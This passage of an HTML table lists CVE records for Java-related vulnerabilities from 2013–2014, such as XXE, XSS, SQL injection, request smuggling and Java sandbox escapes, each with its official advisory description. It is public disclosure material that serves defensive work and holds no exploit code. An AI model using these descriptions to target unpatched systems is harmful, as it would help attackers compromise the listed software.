	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-2296">CVE-2014-2296</a></td>
		<td valign="top">XML external entity (XXE) vulnerability in java/org/jasig/cas/util/SamlUtils.java in Jasig CAS server before 3.4.12.1 and 3.5.x before 3.5.2.1, when Google Accounts Integration is enabled, allows remote unauthenticated users to bypass authentication via crafted XML data.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-2271">CVE-2014-2271</a></td>
		<td valign="top">cn.wps.moffice.common.beans.print.CloudPrintWebView in Kingsoft Office 5.3.1, as used in Huawei P2 devices before V100R001C00B043, falls back to HTTP when the HTTPS connection to the registry fails, which allows man-in-the-middle attackers to conduct downgrade attacks and execute arbitrary Java code by leveraging a network position between the client and the registry to block HTTPS traffic.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-2121">CVE-2014-2121</a></td>
		<td valign="top">The Java-based software in Cisco Hosted Collaboration Solution (HCS) allows remote attackers to cause a denial of service (closing of TCP ports) via unspecified vectors, aka Bug IDs CSCug77633, CSCug77667, CSCug78266, CSCug82795, and CSCuh58643.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-2067">CVE-2014-2067</a></td>
		<td valign="top">Cross-site scripting (XSS) vulnerability in java/hudson/model/Cause.java in Jenkins before 1.551 and LTS before 1.532.2 allows remote authenticated users to inject arbitrary web script or HTML via a "remote cause note."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-2059">CVE-2014-2059</a></td>
		<td valign="top">Directory traversal vulnerability in the CLI job creation (hudson/cli/CreateJobCommand.java) in Jenkins before 1.551 and LTS before 1.532.2 allows remote authenticated users to overwrite arbitrary files via the job name.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-1979">CVE-2014-1979</a></td>
		<td valign="top">The NTT DOCOMO sp mode mail application 5900 through 6300 for Android 4.0.x and 6000 through 6620 for Android 4.1 through 4.4 allows remote attackers to execute arbitrary Java methods via Deco-mail emoticon POP data in an e-mail message.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-1961">CVE-2014-1961</a></td>
		<td valign="top">Unspecified vulnerability in the Portal WebDynPro in SAP NetWeaver allows remote attackers to obtain sensitive path information via unknown attack vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-1939">CVE-2014-1939</a></td>
		<td valign="top">java/android/webkit/BrowserFrame.java in Android before 4.4 uses the addJavascriptInterface API in conjunction with creating an object of the SearchBoxImpl class, which allows attackers to execute arbitrary Java code by leveraging access to the searchBoxJavaBridge_ interface at certain Android API levels.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-1876">CVE-2014-1876</a></td>
		<td valign="top">The unpacker::redirect_stdio function in unpack.cpp in unpack200 in OpenJDK 6, 7, and 8; Oracle Java SE 5.0u61, 6u71, 7u51, and 8; JRockit R27.8.1 and R28.3.1; and Java SE Embedded 7u51 does not securely create temporary files when a log file cannot be opened, which allows local users to overwrite arbitrary files via a symlink attack on /tmp/unpack.log.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-125087">CVE-2014-125087</a></td>
		<td valign="top">A vulnerability was found in java-xmlbuilder up to 1.1. It has been rated as problematic. Affected by this issue is some unknown functionality. The manipulation leads to xml external entity reference. Upgrading to version 1.2 is able to address this issue. The name of the patch is e6fddca201790abab4f2c274341c0bb8835c3e73. It is recommended to upgrade the affected component. The identifier of this vulnerability is VDB-221480.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-125052">CVE-2014-125052</a></td>
		<td valign="top">A vulnerability was found in JervenBolleman sparql-identifiers and classified as critical. This issue affects some unknown processing of the file src/main/java/org/identifiers/db/RegistryDao.java. The manipulation leads to sql injection. The patch is named 44bb0db91c064e305b192fc73521d1dfd25bde52. It is recommended to apply a patch to fix this issue. The associated identifier of this vulnerability is VDB-217571.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-1202">CVE-2014-1202</a></td>
		<td valign="top">The WSDL/WADL import functionality in SoapUI before 4.6.4 allows remote attackers to execute arbitrary Java code via a crafted request parameter in a WSDL file.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0964">CVE-2014-0964</a></td>
		<td valign="top">IBM WebSphere Application Server (WAS) 6.1.0.0 through 6.1.0.47 and 6.0.2.0 through 6.0.2.43 allows remote attackers to cause a denial of service via crafted TLS traffic, as demonstrated by traffic from a CVE-2014-0160 vulnerability-assessment tool.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0931">CVE-2014-0931</a></td>
		<td valign="top">Multiple XML external entity (XXE) vulnerabilities in the (1) CCRC WAN Server / CM Server, (2) Perl CC/CQ integration trigger scripts, (3) CMAPI Java interface, (4) ClearCase remote client, and (5) CMI and OSLC-based ClearQuest integrations components in IBM Rational ClearCase 7.1.0.x, 7.1.1.x, 7.1.2 through 7.1.2.13, 8.0 through 8.0.0.10, and 8.0.1 through 8.0.1.3 allow remote attackers to cause a denial of service or access other servers via crafted XML data. IBM X-Force ID: 92263.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0878">CVE-2014-0878</a></td>
		<td valign="top">The IBMSecureRandom component in the IBMJCE and IBMSecureRandom cryptographic providers in IBM SDK Java Technology Edition 5.0 before Service Refresh 16 FP6, 6 before Service Refresh 16, 6.0.1 before Service Refresh 8, 7 before Service Refresh 7, and 7R1 before Service Refresh 1 makes it easier for context-dependent attackers to defeat cryptographic protection mechanisms by predicting the random number generator's output.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0876">CVE-2014-0876</a></td>
		<td valign="top">Buffer overflow in the Java GUI Configuration Wizard and Preferences Editor in the backup-archive client in IBM Tivoli Storage Manager (TSM) 5.x and 6.x before 6.2.5.2, 6.3.x before 6.3.2, and 6.4.x before 6.4.2 on Windows and OS X allows local users to cause a denial of service (application crash or hang) via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0731">CVE-2014-0731</a></td>
		<td valign="top">The administration interface in Cisco Unified Communications Manager (Unified CM) 10.0(1) and earlier allows remote attackers to bypass authentication and read Java class files via a direct request, aka Bug ID CSCum46497.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0728">CVE-2014-0728</a></td>
		<td valign="top">SQL injection vulnerability in the Java database interface in Cisco Unified Communications Manager (UCM) 10.0(1) and earlier allows remote attackers to execute arbitrary SQL commands via a crafted URL, aka Bug ID CSCum05313.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0514">CVE-2014-0514</a></td>
		<td valign="top">The Adobe Reader Mobile application before 11.2 for Android does not properly restrict use of JavaScript, which allows remote attackers to execute arbitrary code via a crafted PDF document, a related issue to CVE-2012-6636.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0464">CVE-2014-0464</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 8 allows remote attackers to affect confidentiality via unknown vectors related to Scripting, a different vulnerability than CVE-2014-0463.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0463">CVE-2014-0463</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 8 allows remote attackers to affect confidentiality via unknown vectors related to Scripting, a different vulnerability than CVE-2014-0464.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0461">CVE-2014-0461</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u71, 7u51, and 8, and Java SE Embedded 7u51, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Libraries.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0460">CVE-2014-0460</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u61, 6u71, 7u51, and 8; JRockit R27.8.1 and R28.3.1; and Java SE Embedded 7u51 allows remote attackers to affect confidentiality and integrity via vectors related to JNDI.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0459">CVE-2014-0459</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u51 and 8, and Java SE Embedded 7u51, allows remote attackers to affect availability via unknown vectors related to 2D.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0458">CVE-2014-0458</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u71, 7u51, and 8, and Java SE Embedded 7u51, allows remote attackers to affect confidentiality, integrity, and availability via vectors related to JAX-WS, a different vulnerability than CVE-2014-0452 and CVE-2014-2423.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0457">CVE-2014-0457</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u61, SE 6u71, 7u51, and 8; JRockit R27.8.1 and R28.3.1; and Java SE Embedded 7u51 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Libraries.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0456">CVE-2014-0456</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u71, 7u51, and 8, and Java SE Embedded 7u51, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Hotspot.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0455">CVE-2014-0455</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u51 and 8, and Java SE Embedded 7u51, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Libraries, a different vulnerability than CVE-2014-0432 and CVE-2014-2402.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0454">CVE-2014-0454</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u51 and 8, and Java SE Embedded 7u51, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Security.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0453">CVE-2014-0453</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u61, 6u71, 7u51, and 8; JRockit R27.8.1 and R28.3.1; and Java SE Embedded 7u51 allows remote attackers to affect confidentiality and integrity via unknown vectors related to Security.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0452">CVE-2014-0452</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u71, 7u51, and 8, and Java SE Embedded 7u51, allows remote attackers to affect confidentiality, integrity, and availability via vectors related to JAX-WS, a different vulnerability than CVE-2014-0458 and CVE-2014-2423.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0451">CVE-2014-0451</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u61, 6u71, 7u51, and 8, and Java SE Embedded 7u51, allows remote attackers to affect confidentiality, integrity, and availability via vectors related to AWT, a different vulnerability than CVE-2014-2412.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0449">CVE-2014-0449</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u71, 7u51, and 8, and Java SE Embedded 7u51, allows remote attackers to affect confidentiality via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0448">CVE-2014-0448</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u51 and 8 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0446">CVE-2014-0446</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u61, 6u71, 7u51, and 8, and Java SE Embedded 7u51, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Libraries.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0432">CVE-2014-0432</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u51 and 8, and Java SE Embedded 7u51, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Libraries, a different vulnerability than CVE-2014-0455 and CVE-2014-2402.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0429">CVE-2014-0429</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u61, 6u71, 7u51, and 8; JRockit R27.8.1 and R28.3.1; and Java SE Embedded 7u51 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to 2D.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0428">CVE-2014-0428</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u55, 6u65, and 7u45; Java SE Embedded 7u45; and OpenJDK 7 allows remote attackers to affect confidentiality, integrity, and availability via vectors related to CORBA.  NOTE: the previous information is from the January 2014 CPU. Oracle has not commented on third-party claims that the issue is related to "insufficient security checks in IIOP streams," which allows attackers to escape the sandbox.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0424">CVE-2014-0424</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u65 and 7u45 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Deployment, a different vulnerability than CVE-2013-5889, CVE-2013-5902, CVE-2014-0410, CVE-2014-0415, and CVE-2014-0418.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0423">CVE-2014-0423</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u55, 6u65, and 7u45; JRockit R27.7.7 and R28.2.9; Java SE Embedded 7u45; and OpenJDK 7 allows remote authenticated users to affect confidentiality and availability via unknown vectors related to Beans.  NOTE: the previous information is from the January 2014 CPU. Oracle has not commented on third-party claims that this issue is an XML External Entity (XXE) vulnerability in DocumentHandler.java, related to Beans decoding.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0422">CVE-2014-0422</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u55, 6u65, and 7u45; Java SE Embedded 7u45; and OpenJDK 7 allows remote attackers to affect confidentiality, integrity, and availability via vectors related to JNDI.  NOTE: the previous information is from the January 2014 CPU. Oracle has not commented on third-party claims that the issue is related to missing package access checks in the Naming / JNDI component, which allows attackers to escape the sandbox.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0418">CVE-2014-0418</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u65 and 7u45 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Deployment, a different vulnerability than CVE-2013-5889, CVE-2013-5902, CVE-2014-0410, CVE-2014-0415, and CVE-2014-0424.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0417">CVE-2014-0417</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u55, 6u65, and 7u45; JavaFX 2.2.45; and Java SE Embedded 7u45 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to 2D.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0416">CVE-2014-0416</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u55, 6u65, and 7u45; Java SE Embedded 7u45; and OpenJDK 7 allows remote attackers to affect integrity via vectors related to JAAS.  NOTE: the previous information is from the January 2014 CPU. Oracle has not commented on third-party claims that the issue is related to how principals are set for the Subject class, which allows attackers to escape the sandbox using deserialization of a crafted Subject instance.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0415">CVE-2014-0415</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u65 and 7u45 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Deployment, a different vulnerability than CVE-2013-5889, CVE-2013-5902, CVE-2014-0410, CVE-2014-0418, and CVE-2014-0424.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0411">CVE-2014-0411</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u55, 6u65, and 7u45; JRockit R27.7.7 and R28.2.9; Java SE Embedded 7u45; and OpenJDK 7 allows remote attackers to affect confidentiality and integrity via vectors related to JSSE.  NOTE: the previous information is from the January 2014 CPU. Oracle has not commented on third-party claims that this issue allows remote attackers to obtain sensitive information about encryption keys via a timing discrepancy during the TLS/SSL handshake.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0410">CVE-2014-0410</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u65 and 7u45 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Deployment, a different vulnerability than CVE-2013-5889, CVE-2013-5902, CVE-2014-0415, CVE-2014-0418, and CVE-2014-0424.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0408">CVE-2014-0408</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u45, when running on OS X, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Hotspot.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0403">CVE-2014-0403</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u65 and 7u45 allows remote attackers to affect confidentiality and integrity via unknown vectors related to Deployment, a different vulnerability than CVE-2013-5898 and CVE-2014-0375.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0390">CVE-2014-0390</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Solaris 10 allows remote attackers to affect integrity via unknown vectors related to Java Web Console.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0387">CVE-2014-0387</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u65 and Java SE 7u45, when running on Firefox, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0385">CVE-2014-0385</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u45, when installing on OS X, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Install.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0382">CVE-2014-0382</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u45 and JavaFX 2.2.45 allows remote attackers to affect availability via unknown vectors related to JavaFX.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0376">CVE-2014-0376</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u55, 6u65, and 7u45; Java SE Embedded 7u45; and OpenJDK 7 allows remote attackers to affect integrity via vectors related to JAXP.  NOTE: the previous information is from the January 2014 CPU. Oracle has not commented on third-party claims that the issue is related to an improper check for "code permissions when creating document builder factories."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0375">CVE-2014-0375</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u65 and 7u45 allows remote attackers to affect confidentiality and integrity via unknown vectors related to Deployment, a different vulnerability than CVE-2013-5898 and CVE-2014-0403.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0373">CVE-2014-0373</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u55, 6u65, and 7u45, and OpenJDK 7, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Serviceability.  NOTE: the previous information is from the January 2014 CPU. Oracle has not commented on third-party claims that the issue is related to throwing of an incorrect exception when SnmpStatusException should have been used in the SNMP implementation, which allows attackers to escape the sandbox.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0369">CVE-2014-0369</a></td>
		<td valign="top">Unspecified vulnerability in the Siebel Core - EAI component in Oracle Siebel CRM 8.1.1 and 8.2.2 allows remote attackers to affect confidentiality via unknown vectors related to Java Integration, a different vulnerability than CVE-2015-0366.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0368">CVE-2014-0368</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u55, 6u65, and 7u45, and Java SE Embedded 7u45, allows remote attackers to affect confidentiality via unknown vectors related to Networking.  NOTE: the previous information is from the January 2014 CPU. Oracle has not commented on third-party claims that the issue is related to incorrect permission checks when listening on a socket, which allows attackers to escape the sandbox.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0227">CVE-2014-0227</a></td>
		<td valign="top">java/org/apache/coyote/http11/filters/ChunkedInputFilter.java in Apache Tomcat 6.x before 6.0.42, 7.x before 7.0.55, and 8.x before 8.0.9 does not properly handle attempts to continue reading data after an error has occurred, which allows remote attackers to conduct HTTP request smuggling attacks or cause a denial of service (resource consumption) by streaming data with malformed chunked transfer coding.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0111">CVE-2014-0111</a></td>
		<td valign="top">Apache Syncope 1.0.0 before 1.0.9 and 1.1.0 before 1.1.7 allows remote administrators to execute arbitrary Java code via vectors related to Apache Commons JEXL expressions, "derived schema definition," "user / role templates," and "account links of resource mappings."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0107">CVE-2014-0107</a></td>
		<td valign="top">The TransformerFactory in Apache Xalan-Java before 2.7.2 does not properly restrict access to certain properties when FEATURE_SECURE_PROCESSING is enabled, which allows remote attackers to bypass expected restrictions and load arbitrary classes or access external resources via a crafted (1) xalan:content-header, (2) xalan:entities, (3) xslt:content-header, or (4) xslt:entities property, or a Java property that is bound to the XSLT 1.0 system-property function.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0099">CVE-2014-0099</a></td>
		<td valign="top">Integer overflow in java/org/apache/tomcat/util/buf/Ascii.java in Apache Tomcat before 6.0.40, 7.x before 7.0.53, and 8.x before 8.0.4, when operated behind a reverse proxy, allows remote attackers to conduct HTTP request smuggling attacks via a crafted Content-Length HTTP header.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0096">CVE-2014-0096</a></td>
		<td valign="top">java/org/apache/catalina/servlets/DefaultServlet.java in the default servlet in Apache Tomcat before 6.0.40, 7.x before 7.0.53, and 8.x before 8.0.4 does not properly restrict XSLT stylesheets, which allows remote attackers to bypass security-manager restrictions and read arbitrary files via a crafted web application that provides an XML external entity declaration in conjunction with an entity reference, related to an XML External Entity (XXE) issue.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0095">CVE-2014-0095</a></td>
		<td valign="top">java/org/apache/coyote/ajp/AbstractAjpProcessor.java in Apache Tomcat 8.x before 8.0.4 allows remote attackers to cause a denial of service (thread consumption) by using a "Content-Length: 0" AJP request to trigger a hang in request processing.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0093">CVE-2014-0093</a></td>
		<td valign="top">Red Hat JBoss Enterprise Application Platform (JBEAP) 6.2.2, when using a Java Security Manager (JSM), does not properly apply permissions defined by a policy file, which causes applications to be granted the java.security.AllPermission permission and allows remote attackers to bypass intended access restrictions.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0075">CVE-2014-0075</a></td>
		<td valign="top">Integer overflow in the parseChunkHeader function in java/org/apache/coyote/http11/filters/ChunkedInputFilter.java in Apache Tomcat before 6.0.40, 7.x before 7.0.53, and 8.x before 8.0.4 allows remote attackers to cause a denial of service (resource consumption) via a malformed chunk size in chunked transfer coding of a request during the streaming of data.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-0003">CVE-2014-0003</a></td>
		<td valign="top">The XSLT component in Apache Camel 2.11.x before 2.11.4, 2.12.x before 2.12.3, and possibly earlier versions allows remote attackers to execute arbitrary Java methods via a crafted message.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-7398">CVE-2013-7398</a></td>
		<td valign="top">main/java/com/ning/http/client/AsyncHttpClientConfig.java in Async Http Client (aka AHC or async-http-client) before 1.9.0 does not require a hostname match during verification of X.509 certificates, which allows man-in-the-middle attackers to spoof HTTPS servers via an arbitrary valid certificate.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-7372">CVE-2013-7372</a></td>
		<td valign="top">The engineNextBytes function in classlib/modules/security/src/main/java/common/org/apache/harmony/security/provider/crypto/SHA1PRNG_SecureRandomImpl.java in the SecureRandom implementation in Apache Harmony through 6.0M3, as used in the Java Cryptography Architecture (JCA) in Android before 4.4 and other products, when no seed is provided by the user, uses an incorrect offset value, which makes it easier for attackers to defeat cryptographic protection mechanisms by leveraging the resulting PRNG predictability, as exploited in the wild against Bitcoin wallet applications in August 2013.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-6814">CVE-2013-6814</a></td>
		<td valign="top">The J2EE Engine in SAP NetWeaver 6.40, 7.02, and earlier allows remote attackers to redirect users to arbitrary web sites, conduct phishing attacks, and obtain sensitive information (cookies and SAPPASSPORT) via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-6735">CVE-2013-6735</a></td>
		<td valign="top">IBM WebSphere Portal 6.0.0.x through 6.0.0.1, 6.0.1.x through 6.0.1.7, 6.1.0.x through 6.1.0.6 CF27, 6.1.5.x through 6.1.5.3 CF27, 7.0.0.x through 7.0.0.2 CF26, and 8.0.0.x through 8.0.0.1 CF08 allows remote attackers to obtain sensitive Java Content Repository (JCR) information via a modified Web Content Manager (WCM) URL.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-6727">CVE-2013-6727</a></td>
		<td valign="top">The Connect client in IBM Sametime 8.5.2 through 8.5.2.1 and 9.0 before HF1 does not properly restrict unsigned Java plugins, which allows remote attackers to obtain sensitive information via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-6493">CVE-2013-6493</a></td>
		<td valign="top">The LiveConnect implementation in plugin/icedteanp/IcedTeaNPPlugin.cc in IcedTea-Web before 1.4.2 allows local users to read the messages between a Java applet and a web browser by pre-creating a temporary socket file with a predictable name in /tmp.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-6469">CVE-2013-6469</a></td>
